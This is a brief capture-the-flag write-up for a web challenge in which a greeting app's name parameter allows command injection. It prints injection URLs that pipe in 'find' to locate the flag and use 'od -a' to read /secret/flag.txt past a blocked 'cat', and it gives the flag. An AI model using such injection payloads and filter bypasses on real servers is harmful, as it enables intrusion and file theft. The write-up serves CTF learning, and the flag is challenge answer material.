
*A seemingly simple web application greets users based on their input. But appearances can be deceptive. [https://cybersecure-x-namedropper.chals.io](https://)*

This challenge is solved using a command injection vulnerability with the name parameter.
The url https://cybersecure-x-namedropper.chals.io/?name=|find+/+-name+%22flag*%22 gives:


![image](Pasted%20image%2020250613195039.png)

Now we can read /secret/flag.txt

Trying to run cat /secret/flag.txt shows us that the command in blocked. Therefore we must use other methods to read the flag.

Running  https://cybersecure-x-namedropper.chals.io/?name=|od+-a+/secret/flag.txt gives us:

![image](Pasted%20image%2020250613195320.png)

Flag
`flag{r3str1ct3d_d0esn7_m34n_s3cur3}`


